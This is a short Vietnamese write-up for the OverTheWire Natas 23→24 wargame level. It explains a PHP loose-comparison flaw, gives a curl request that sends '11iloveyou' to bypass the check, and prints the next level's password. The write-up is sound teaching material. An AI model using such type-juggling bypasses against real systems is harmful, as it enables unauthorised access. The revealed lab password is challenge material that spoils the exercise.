# Natas 23 → 24

## Mục tiêu

Lấy password của `natas24` qua điều kiện PHP yếu.

## Tôi thấy

Source yêu cầu `strstr(passwd, "iloveyou")` và so sánh chuỗi với số `10`. PHP tự chuyển chuỗi bắt đầu bằng số thành số khi so sánh lỏng.

## Cách làm

```bash
curl -u natas23:<password> --get \
  --data-urlencode 'passwd=11iloveyou' \
  http://natas23.natas.labs.overthewire.org/
```

## Vì sao cách này hiệu quả

`11iloveyou` chứa chuỗi cần tìm và khi so sánh `> 10`, PHP chuyển phần đầu thành số `11`.

## Kết quả

Password của `natas24`:

```text
shlL4BvOtawNCd81dwdKRHFzmTEjYYQX
```

